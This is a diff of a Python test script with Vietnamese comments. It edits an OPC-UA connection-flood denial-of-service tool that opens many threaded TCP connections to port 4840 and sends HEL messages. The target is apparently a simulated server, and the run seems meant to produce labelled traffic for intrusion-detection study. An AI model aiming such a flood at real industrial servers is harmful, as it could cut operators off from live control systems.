@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
 tests/test_opcua_dos.py
-OPC-UA Connection Flood DoS — tạo hàng trăm TCP+HEL mỗi giây.
-Server phải tốn tài nguyên xử lý -> có thể từ chối HMI thật.
+OPC-UA Connection Flood DoS — target opcua_sim_server.
 
 Chạy: python tests/test_opcua_dos.py
 """
@@ -36,7 +35,7 @@ def flood_worker(host, port, hello, results, lock, end_time):
     while time.time() < end_time:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
+            s.settimeout(1)
             s.connect((host, port))
             s.send(hello)
             s.close()
@@ -52,9 +51,7 @@ def main():
     port = 4840
 
     print(f"\n{B}[TEST] OPCUA_DOS_FLOOD{X}")
-    info(f"Target: {host}:{port}")
-    info(f"Threads: {THREADS} | Duration: {DURATION}s")
-    info("Flood OPC-UA HEL connections -> DoS")
+    info(f"Target: {host}:{port}  Threads: {THREADS}  Duration: {DURATION}s")
 
     changes = []
     observable = []
@@ -76,7 +73,6 @@ def main():
             threads.append(t)
             t.start()
 
-        # Monitor
         start = time.time()
         while time.time() < end_time:
             time.sleep(1)
@@ -90,12 +86,11 @@ def main():
 
         rate = results["success"] // max(1, DURATION)
         observable.append(f"OPC-UA DoS: {results['success']} connects trong {DURATION}s ({rate}/s)")
-        observable.append(f"{THREADS} threads -> connection exhaustion")
         notes.append(f"Total: {results['success']} sent | {results['failed']} failed")
-        notes.append(f"Rate: ~{rate} connections/s")
-        notes.append("Wireshark: tcp.port==4840 -> SYN flood pattern")
-        notes.append("CIC: extremely high Flow Packets/s, uniform packet size")
+        notes.append("CIC: extremely high Flow Packets/s")
 
+    except KeyboardInterrupt:
+        info("Stopped by user")
     except Exception as e:
         error = str(e)
         fail(str(e))
